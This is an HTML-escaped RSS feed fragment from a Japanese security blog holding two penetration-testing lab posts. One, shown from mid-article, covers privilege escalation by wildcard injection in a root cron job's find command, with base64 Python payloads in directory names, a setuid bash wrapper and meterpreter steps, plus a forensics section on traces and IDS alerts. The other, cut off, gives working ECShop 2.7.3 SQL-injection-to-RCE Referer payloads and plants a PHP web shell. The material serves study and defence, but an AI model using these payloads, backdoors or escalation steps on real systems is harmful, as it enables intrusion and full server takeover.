&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;shu@kali:/tmp/images$ ls -l
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;total 20
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;drwxr-xr-x 2 shu shu 4096 May 13 08:34 &amp;#39;&lt;/span&gt;* -exec bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;touch aaa&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; shu shu  &lt;span class=&#34;m&#34;&gt;245&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:45  vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。&lt;/p&gt;
&lt;h3 id=&#34;pythonによるワンライナー&#34;&gt;Pythonによるワンライナー&lt;/h3&gt;
&lt;p&gt;このままでは単一コマンドしか使えないので、侵害には使いづらいです。&lt;br&gt;
ただ、今回ECShopが稼働しているサーバにはPythonが入っていました。&lt;/p&gt;
&lt;p&gt;Pythonやperlなど、高機能なコマンドが入っていると侵害に非常に役に立ちます。&lt;br&gt;
スペースやスラッシュなんてbase64エンコードしてしまえばいいのです。&lt;/p&gt;
&lt;p&gt;ということで、できあがったものがこちらです。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir &amp;#34;* -exec python -c exec(&amp;#39;[base64エンコードしたpythonコード]&amp;#39;.decode(&amp;#39;base64&amp;#39;)) ;&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。&lt;/p&gt;
&lt;br/&gt;
&lt;h4 id=&#34;試しにディレクトリ作成&#34;&gt;試しにディレクトリ作成&lt;/h4&gt;
&lt;p&gt;1度にtouchコマンドを2回使ってaaa、bbbディレクトリを作成してみます。&lt;/p&gt;
&lt;p&gt;os.systemを使えばOSコマンドが実行できます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &amp;#34;import os;os.system(&amp;#39;touch aaa; touch bbb&amp;#39;)&amp;#34;.encode(&amp;#34;base64&amp;#34;)
&amp;#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ mkdir &lt;span class=&#34;s2&#34;&gt;&amp;#34;* -exec python -c exec(&amp;#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==&amp;#39;.decode(&amp;#39;base64&amp;#39;)) ;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ bash vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;./find_test_python.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;ディレクトリが作成されていることがわかります。&lt;/p&gt;
&lt;br/&gt;
&lt;h1 id=&#34;wildcard-injection-を使って権限昇格する&#34;&gt;Wildcard Injection を使って権限昇格する&lt;/h1&gt;
&lt;p&gt;おまたせしました。ここでやっとVictim環境で権限昇格です。&lt;/p&gt;
&lt;p&gt;これまでの内容で、findを使って任意のOSコマンドが実行できることがわかりました。&lt;br&gt;
そして今回は bakProductImage.sh が root 権限で実行されてそうなこともわかっています。&lt;br&gt;
今までの材料を使って権限昇格を試みます。&lt;/p&gt;
&lt;h3 id=&#34;bashラッパーを作成&#34;&gt;bashラッパーを作成&lt;/h3&gt;
&lt;p&gt;以下のコードのファイルを作成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

int main()
{
	setuid(geteuid());
	system(&amp;#34;/bin/bash&amp;#34;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;victimに送信し、コンパイルします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; upload bash_wrapper.c /tmp/.session
[*] uploading  : bash_wrapper.c -&amp;gt; /tmp/.session
[*] uploaded   : bash_wrapper.c -&amp;gt; /tmp/.session/bash_wrapper.c
meterpreter &amp;gt; shell
Process 10068 created.
Channel 16 created.

gcc -o w ./bash_wrapper.c

ls -l ./w
-rwxr-xr-x 1 www-data www-data 6976 May 12 15:43 ./w
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ラッパーが作成されました。&lt;/p&gt;
&lt;h3 id=&#34;ラッパーの権限を操作するディレクトリを作成&#34;&gt;ラッパーの権限を操作するディレクトリを作成&lt;/h3&gt;
&lt;p&gt;次に、ラッパーの所有者をrootにしてsuidを付与する⚠️危険⚠️なディレクトリを作成します。&lt;br&gt;
作成先は、bakProductImage.sh のfind対象である /var/www/html/images 配下です。&lt;/p&gt;
&lt;p&gt;まずはbase64エンコード。&lt;br&gt;
「chown root /tmp/.session/w; chmod u+s /tmp/.session/w」というコマンドを実行するPythonコードをbase64エンコードします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &amp;#34;import os;os.system(&amp;#39;chown root /tmp/.session/w; chmod u+s /tmp/.session/w&amp;#39;)&amp;#34;.encode(&amp;#34;base64&amp;#34;)
&amp;#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ディレクトリを作成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 10076 created.
Channel 17 created.

mkdir &amp;#34;* -exec python -c exec(&amp;#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==&amp;#39;.decode(&amp;#39;base64&amp;#39;)) ;&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;./escalation_images_dir.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;作成できました。&lt;/p&gt;
&lt;p&gt;なおfindに対してWildcard Injectionをするときは、コードが 255 文字を超えないように気をつけてください。&lt;br&gt;
大体のファイルシステムは、名前の最大長が 255 文字であるため、コードが長すぎると作成できません。&lt;/p&gt;
&lt;p&gt;255文字を超える恐れがあるなら、予め別のシェルスクリプトを作成し、injection時はそのスクリプトを呼ぶようにすればいいです。&lt;/p&gt;
&lt;p&gt;あとは 翌日 1 時の cron の実行を待つだけです！&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;翌日1時&#34;&gt;～翌日1時～&lt;/h4&gt;
&lt;p&gt;1時になったので、ラッパーファイルの状態を見てみます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./escalation_success_dir.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;見事ラッパーファイルの所有者がrootになってsuidがついていますね。
更新日時も1時になっています。&lt;/p&gt;
&lt;p&gt;早速アクセスします。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./escalation_success_whoami.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;画像の通り root 権限になっています。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;権限昇格成功です💪&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;あとはmeterpreterを接続するなりしてなんでも好きなことができます。&lt;/p&gt;
&lt;br/&gt;
&lt;hr&gt;
&lt;h1 id=&#34;攻撃の痕跡&#34;&gt;攻撃の痕跡&lt;/h1&gt;
&lt;h2 id=&#34;ids&#34;&gt;IDS&lt;/h2&gt;
&lt;p&gt;WSOやmeterpreterの接続など、初期侵入の部分は検知してくれました。&lt;br&gt;
ただ、meterpreter接続後は全く検知しませんでした。&lt;/p&gt;
&lt;p&gt;入口対策、および初期侵入の検知時にいかに対応できるかが侵害発見のポイントになりそうです。&lt;/p&gt;
&lt;p&gt;検知シグネチャは以下のとおり。&lt;/p&gt;
&lt;br/&gt;
&lt;h4 id=&#34;et-attack_response-wso---webshell-activity---wso-title&#34;&gt;ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title&lt;/h4&gt;
&lt;p&gt;WSOの各操作のレスポンスで検知しました。&lt;/p&gt;
&lt;h4 id=&#34;et-policy-executable-and-linking-format-elf-file-download&#34;&gt;ET POLICY Executable and linking format (ELF) file download&lt;/h4&gt;
&lt;p&gt;meterpreter にスイッチするためにmeterpreter stageをダウンロードするので、その時のバイナリを検知しました。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./ids_meterpreter_stager.png&#34;/&gt;
&lt;/figure&gt;

&lt;br/&gt;
&lt;h3 id=&#34;ファイルシステム&#34;&gt;ファイルシステム&lt;/h3&gt;
&lt;p&gt;攻撃者は、全てのアクションは最初に侵入したユーザの権限の範囲内でのみ行なえます。&lt;/p&gt;
&lt;p&gt;今回はwww-dataユーザだったので、以下のディレクトリに書き込みが可能でした。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/tmp&lt;/li&gt;
&lt;li&gt;/var/tmp&lt;/li&gt;
&lt;li&gt;/var/www/html&lt;/li&gt;
&lt;li&gt;/var/run/apache2&lt;/li&gt;
&lt;li&gt;/run/apache2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。&lt;br&gt;
なので /var/www/html など、tmpの他に侵害ユーザが書き込み可能なディレクトリも全て洗い出すべきですね。&lt;/p&gt;
&lt;p&gt;下記findコマンドでwww-dataが書き込み可能なディレクトリを調べられます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / &lt;span class=&#34;se&#34;&gt;\(&lt;/span&gt; -perm -002 -o -user www-data -o -group www-data &lt;span class=&#34;se&#34;&gt;\)&lt;/span&gt; -type d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br/&gt;
また、攻撃者は今回/tmp/.sessionを作業ディレクトリにしました。  
ドットファイル/ドットディレクトリはlsコマンド単体では出てこないので注意。  
(ls -aやfindなら出てくる）
&lt;br/&gt;
&lt;h4 id=&#34;tmpbc&#34;&gt;/tmp/bc&lt;/h4&gt;
&lt;p&gt;WSO のリバースコネクト用バイナリ。&lt;br&gt;
WSOのリバースコネクトは、作成するファイル形式をCバイナリかperlスクリプトか選べます。&lt;br&gt;
Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作成します。&lt;/p&gt;
&lt;br/&gt;
&lt;h4 id=&#34;tmpsessionw&#34;&gt;/tmp/.session/w&lt;/h4&gt;
&lt;p&gt;権限昇格用バイナリ。suidがついているので大変わかりやすいです。&lt;/p&gt;
&lt;p&gt;find で suid が付与されているファイルを洗い出せば出てきます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./forensics_find_suid.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;一つだけ/tmpに存在するのでバレバレですね。&lt;br&gt;
攻撃者は/usr/bin/ や /bin/ にファイルを作成できないのでこんなことになるのです。&lt;/p&gt;
&lt;br/&gt;
&lt;h4 id=&#34;varwwwhtmlimages--exec-python--c-execaw1略kqdecodebase64-&#34;&gt;/var/www/html/images/* -exec python -c exec(&amp;lsquo;aW1(略)KQ==&amp;rsquo;.decode(&amp;lsquo;base64&amp;rsquo;)) ;&lt;/h4&gt;
&lt;p&gt;もはやネタ。&lt;br&gt;
攻撃者は何回も実行されないように一回実行されたら削除しますが、当然痕跡としては残ります。&lt;br&gt;
フォレンジック時、「-exec」を含むファイル/ディレクトリを探すといいかもしれません。&lt;/p&gt;
&lt;br/&gt;
&lt;h3 id=&#34;プロセス&#34;&gt;プロセス&lt;/h3&gt;
&lt;p&gt;侵害調査時、万が一攻撃者が活動してて鉢合わせたらプロセスですぐにわかります。&lt;/p&gt;
&lt;p&gt;以下は「ps auxwf」の結果です。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./forensics_ps.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;以下の流れであることがひと目でわかりますね。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;WSOでリバースコネクト&lt;/li&gt;
&lt;li&gt;meterpreter の stager&lt;/li&gt;
&lt;li&gt;meterpreter (/tmp/Xeokj)&lt;/li&gt;
&lt;li&gt;権限昇格用バイナリ ./w (root権限)&lt;/li&gt;
&lt;li&gt;./w が root 権限で bash を起動&lt;/li&gt;
&lt;/ol&gt;
&lt;br/&gt;
攻撃者としては鉢合わせないように、常にnetstat(ss)やpsに目を光らせておく必要がありますね。
&lt;hr&gt;
&lt;h2 id=&#34;コラムというか雑記&#34;&gt;コラム（というか雑記）&lt;/h2&gt;
&lt;p&gt;find に対する Wildcard Injection の解説はどこよりも詳しく書けたんじゃないかな・・・&lt;/p&gt;
&lt;p&gt;というのも、この脆弱性には縁があるのです。&lt;/p&gt;
&lt;p&gt;2017年にPaloAlto の NGFWである PAシリーズで、root 権限で RCE可能な脆弱性 (CVE-2017-15944) が見つかりました。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://www.security-next.com/088709&#34;&gt;http://www.security-next.com/088709&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;そして、当時SOCアナリストだった私はこの脆弱性のPoCが公開される前に自分で検証してrootを取ることができました。
そして検証の結果なかなかにやばい脆弱性ということがわかったので記事にしたのです。（記事はCVEでググってください）&lt;/p&gt;
&lt;p&gt;そのCVE-2017-15944 についてですが、これは今回と同じくログを定期バックアップするシェルスクリプトに脆弱性があり、
同様に find コマンドの Wildcard Injection の脆弱性でした。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://seclists.org/fulldisclosure/2017/Dec/38&#34;&gt;https://seclists.org/fulldisclosure/2017/Dec/38&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;この脆弱性を調査する過程で Wildcard Injectionを学んだのですが、当時は記事の速報性を重視したために攻撃の原理を書けず悔しい思いをしたので、ここでまとめてかくことにしました。&lt;/p&gt;
&lt;p&gt;これで成仏できます。😇&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;今回はAD侵害までいけず、Linux環境の権限昇格のところまででした。
次こそADにいきたいですが、フォワーディングだけで終わりそう&lt;/p&gt;
&lt;p&gt;以上。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>ペネトレ検証-権限昇格とWildcard Injectionの原理</title>
        <link>https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>ペネトレ検証-ECサイトに侵入</title>
      <link>https://www.shutingrz.com/post/ad_hack-ec_exploit/</link>
      <pubDate>Sat, 11 May 2019 07:01:20 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/ad_hack-ec_exploit/</guid>
      <description>&lt;p&gt;しゅーとです。&lt;/p&gt;
&lt;p&gt;家にADの検証環境を立てたので、一連のペネトレーションテストの練習をします。&lt;br&gt;
また、攻撃後にブルーチーム目線で攻撃の痕跡がどう残っているかも確認します。&lt;/p&gt;
&lt;p&gt;今回は初期侵入フェーズとしてECサイトへの侵入です。
エクスプロイトとバックドアの作成をやっていきます。&lt;/p&gt;
&lt;p&gt;なお今回はIDSとして申し訳程度にSuricataを立てていますが、デフォルトのポリシーだし正直検知できるとは思っていません。&lt;/p&gt;
&lt;p&gt;自作自演のため妙に察しがいいかもしれませんが、それはご愛嬌。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;バックグラウンド&#34;&gt;バックグラウンド&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ターゲット組織はDMZでECサイトを運用している&lt;/li&gt;
&lt;li&gt;DMZから社内LANに接続可能（きょうびそんな構成あるんかいな）&lt;/li&gt;
&lt;li&gt;OPNSenseでSuricataを立ててIDSモードで運用している(DMZ/社内LANを監視)&lt;/li&gt;
&lt;li&gt;攻撃者はターゲット組織がECサイトを運営していることを知っている
&lt;ul&gt;
&lt;li&gt;IPアドレスは 192.168.2.24:80 ということも把握済み&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;今回は初期侵入フェーズとしてECサイトへの侵入です。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;侵入&#34;&gt;侵入&lt;/h1&gt;
&lt;h2 id=&#34;偵察&#34;&gt;偵察&lt;/h2&gt;
&lt;p&gt;192.168.2.24:80 にアクセスします。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./website.png&#34;/&gt;
&lt;/figure&gt;

&lt;br/&gt;
ECShopが立ち上がっています。(中国語・・・)  
ECShopは中国で流行っているらしいECサイトアプリケーションで、  
色々なバージョンでSQLインジェクションの脆弱性があることが知られています。
&lt;p&gt;ソースコードを確認し、バージョンを調べます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./website_source.png&#34;/&gt;
&lt;/figure&gt;

&lt;br/&gt;
画像の通り、2.7.3 が使われていました。
&lt;p&gt;ECShop 2.7.3 には SQLインジェクションと、それを起因とする RCE の脆弱性が存在するようです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.morihi-soc.net/?p=1263&#34;&gt;https://www.morihi-soc.net/?p=1263&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600&#34;&gt;https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上記URL記載のPoCを参考に、phpinfo()を実行するペイロードを作成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ php makePayload.php &amp;#34;phpinfo ();&amp;#34;
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:107:&amp;#34;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:11:&amp;#34;-1&amp;#39; UNION/*&amp;#34;;}554fcae493e564ee0dc75bdf2ebf94ca
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上記のようなRefererヘッダを付与して「192.168.2.24/user.php?act=login」に送信。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./website_phpinfo.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;phpinfoが実行され、攻撃が成功したことがわかります。&lt;/p&gt;
&lt;p&gt;次に、OSコマンドも実行できるかを確認します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ php makePayload.php &amp;#34;passthru        (&amp;#39;expr 123 + 123&amp;#39;)&amp;#34;
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:139:&amp;#34;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b70617373746872750928276578707220313233202b2031323327292f2f7d787878,10-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:11:&amp;#34;-1&amp;#39; UNION/*&amp;#34;;}554fcae493e564ee0dc75bdf2ebf94ca
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;レスポンス。&lt;br&gt;
&lt;figure&gt;&lt;img src=&#34;./website_expr.png&#34;/&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;exprコマンドで 123 + 123 が計算されていることから、OSコマンドが実行できてますね。&lt;/p&gt;
&lt;h2 id=&#34;バックドア作成&#34;&gt;バックドア作成&lt;/h2&gt;
&lt;p&gt;この脆弱性のみを使って侵害を拡大するのはペイロード作成が面倒くさいのでバックドアを作成することにしましょう。&lt;/p&gt;
&lt;p&gt;バックドアを作成するにあたり、とりあえず3つの選択肢が浮かびました。&lt;/p&gt;
&lt;br/&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;php webshellを作成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FWの制約を受けない&lt;/li&gt;
&lt;li&gt;痕跡が非常に残りやすい（アクセスログ、エラーログ）&lt;/li&gt;
&lt;li&gt;ファイルを新規作成するためファイルシステムレベルでの痕跡の抹消が困難。&lt;/li&gt;
&lt;li&gt;公開ディレクトリの書き込み権限がない可能性がある（あんまりないと思うけど）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;bind tcp&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FWの制約を非常に受けやすい。
&lt;ul&gt;
&lt;li&gt;FWで公開ポートを制限してたら無理。普通の組織なら制限してる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;プロセスを終了してしまえば痕跡は残りにくい&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;reverse tcp&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bind tcpよりはFWの制約を受けづらい
&lt;ul&gt;
&lt;li&gt;ただセキュアな運用なら内外SYNパケットを制限してるかも&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攻撃者側で、待受できるグローバルIPを持つホストを用意する必要がある&lt;/li&gt;
&lt;li&gt;プロセスを終了してしまえば痕跡は残りにくい&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;br/&gt;
&lt;p&gt;それぞれメリットデメリットがありますが、今回は一番成功率が高いと思われる1のwebshell作成を選びました。&lt;/p&gt;
&lt;h3 id=&#34;ペイロードにドットが使えない問題&#34;&gt;ペイロードにドット(.)が使えない問題&lt;/h3&gt;
&lt;p&gt;バックドア作成のためにペイロードを調査していたところ、こちらで渡した文字列のなかでドット(.)が「&amp;rsquo;][&amp;rsquo;」に置き換わってしまうことがわかりました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ php makePayload.php &amp;#34;print(\&amp;#34;test.txt\&amp;#34;);&amp;#34;           
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:121:&amp;#34;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b7072696e742822746573742e74787422293b2f2f7d787878,10-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:11:&amp;#34;-1&amp;#39; UNION/*&amp;#34;;}554fcae493e564ee0dc75bdf2ebf94ca
&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;./website_dot_problem.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;これは本脆弱性の原因となった、ECShopのselect関数(とget_val)の処理によるものと考えます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/691/&#34;&gt;https://paper.seebug.org/691/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;get_valをみるとドット(.)の他に &amp;ldquo;[&amp;rdquo;, &amp;ldquo;|&amp;rdquo;, &amp;ldquo;.$&amp;ldquo;とかもダメそうです。&lt;/p&gt;
&lt;p&gt;ドット(.)が使えないと .php ファイルが作れないので辛いです。&lt;/p&gt;
&lt;p&gt;ただ、これはドット(.)をbase64エンコードしたものを渡してbase64_decodeさせれば回避できました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ php makePayload.php &amp;#39;print(base64_decode(&amp;#34;dGVzdC50eHQ=&amp;#34;));&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;./website_dot_problem_fix.png&#34;/&gt;
&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;簡易的なバックドアの設置&#34;&gt;簡易的なバックドアの設置&lt;/h2&gt;
&lt;p&gt;文字の問題はクリアしたのでバックドアを設置します。&lt;/p&gt;
&lt;p&gt;以下のコードをbase64エンコードします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file_put_contents(&amp;#39;cmd.php&amp;#39;,&amp;#39;&amp;lt;?php passthru($_GET[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;エンコードしたものをassertに渡して評価させるように。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ php makePayload.php &amp;#39;assert(base64_decode(&amp;#34;ZmlsZV9wdXRfY29udGVudHMoJ2NtZC5waHAnLCc8P3BocCBwYXNzdGhydSgkX0dFVFsiY21kIl0pOyA/Picp&amp;#34;));&amp;#39;
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:305:&amp;#34;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a324e745a4335776148416e4c4363385033426f6343427759584e7a644768796453676b58306446564673695932316b496c30704f79412f506963702229293b2f2f7d787878,10-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:11:&amp;#34;-1&amp;#39; UNION/*&amp;#34;;}554fcae493e564ee0dc75bdf2ebf94ca
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成したペイロードをサーバに送信します。&lt;/p&gt;
&lt;p&gt;送信後、cmd.phpを叩いてみます。uname -aを実行してみましょう。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./website_minimal_backdoor.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;uname -a の結果が表示できています。&lt;br&gt;
ちなみにphpはwww-dataユーザで動いているので/etc/shadowは見られませんでした。&lt;/p&gt;
&lt;br/&gt;
&lt;h2 id=&#34;リッチなバックドアの設置&#34;&gt;リッチなバックドアの設置&lt;/h2&gt;
&lt;p&gt;簡易バックドアで調査をした過程で、curlでインターネットに出られる(内外のSYNパケットが許可されている)ことがわかったので、githubからWSOを持ってくることにしました。&lt;/p&gt;
